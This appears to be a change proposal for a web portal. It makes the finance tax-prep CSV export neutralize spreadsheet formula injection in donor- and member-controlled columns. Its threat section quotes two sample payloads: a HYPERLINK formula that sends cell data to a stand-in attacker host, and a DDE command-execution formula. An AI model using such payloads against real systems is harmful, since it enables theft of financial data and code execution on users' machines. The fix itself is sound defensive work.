# Neutralize spreadsheet formula injection in the tax-prep CSV export

## Why

The finance tax-prep export writes every free-text column with the plain
RFC 4180 writer, not the formula-neutralizing one:

- `src/web/portal/admin/finance/reports.rs:336` — `push_csv(&mut out, &r.description)`
- `src/web/portal/admin/finance/reports.rs:338` — `push_csv(&mut out, &r.counterparty)`
- `src/web/portal/admin/finance/reports.rs:340` — `push_csv(&mut out, &r.category)`
- `src/web/portal/admin/finance/reports.rs:342` — `push_csv(&mut out, &r.account)`

`push_csv` (`src/web/portal/admin/csv.rs:9`) only quotes and doubles `"`. The
sibling helper `push_csv_user` (`src/web/portal/admin/csv.rs:32`) — which
prefixes a leading `=`/`+`/`-`/`@`/TAB/CR/LF with `'` — already exists and is
already used by the member roster export
(`src/web/portal/admin/members/bulk.rs:134`) and the audit-log export
(`src/web/portal/admin/audit.rs:217`). The tax-prep export was never converted.

Two of those columns carry **unauthenticated attacker-controlled** text:

- `counterparty` is the joined `members.full_name`, or for a public donation
  `format!("{} <{}>", donor_name, donor_email)`
  (`src/web/portal/admin/finance/reports.rs:529-535`). `donor_name` /
  `donor_email` come straight from the anonymous `POST /public/donate` body,
  which validates only non-empty / `@`-containing / length
  (`src/api/handlers/public.rs:1277-1290`) — no character restriction.
- `description` for a public donation is
  `format!("{} — {}", product_name, donor_name)`
  (`src/payments/stripe_client.rs:444`), so the donor's chosen string is the
  tail of the cell. A logged-in member reaches the same columns by setting
  their own `full_name` (`src/web/portal/profile.rs:95-118` bounds length
  only).

Attacker: anyone on the internet who can reach `POST /public/donate` (or any
member editing their profile name). They submit a donor name such as
`=HYPERLINK("https://evil.example/x?d="&A1,"Open")` or
`=cmd|'/c calc'!A1`. Harm: the org's treasurer downloads
`GET /portal/admin/finance/reports/tax-prep?year=YYYY` and opens it in Excel /
LibreOffice / Sheets; the cell is evaluated as a formula in the treasurer's
desktop context — data exfiltration of the surrounding financial rows via a
formula-built URL, or DDE command execution on the treasurer's machine
(CWE-1236). This is the exact attack canon already forbids for the other two
CSV exports; the finance export is the one that was missed.

**This is a contract change**, which is why it is a spec-lane change rather
than an issue: canon's `expense-tracking` requirement "Tax-prep CSV export
combines income, refunds, and expenses" fixes the columns and says nothing
about neutralization, so today's un-neutralized bytes are permitted output.
Adding the rule changes what the endpoint emits for those cells. The new
requirement deliberately reuses the exact title shape and wording canon
already uses for this invariant in `bulk-member-csv-export` ("Exported CSV
neutralizes spreadsheet formula injection") and `admin-audit-log`
("Audit-log CSV export neutralizes spreadsheet formula injection"), rather
than coining new vocabulary or restating the unrelated column/inclusion rules
of the existing tax-prep requirement.

## What Changes

- `tax_prep_csv` writes its four free-text columns (`description`,
  `counterparty`, `category`, `account`) with the existing
  `push_csv_user` helper instead of `push_csv`. No new helper is introduced —
  `push_csv_user` already implements exactly this rule and is already tested.
- The server-controlled columns (`date`, `type`, `amount`, `reference`) stay
  on `push_csv` and are not altered, matching how the roster and audit exports
  split the two.
- Spec delta: a new `expense-tracking` requirement stating the invariant,
  named and worded to match its two existing siblings in other capabilities.

## Impact

- `src/web/portal/admin/finance/reports.rs` — the four `push_csv` calls in
  `tax_prep_csv`'s serialize loop, plus the import.
- Spec delta: `openspec/specs/expense-tracking/spec.md` — one ADDED
  requirement.
- No schema change, no route change, no new dependency. Existing values are
  not rewritten in the database; only the exported bytes change, and only for
  cells that begin with a formula trigger.
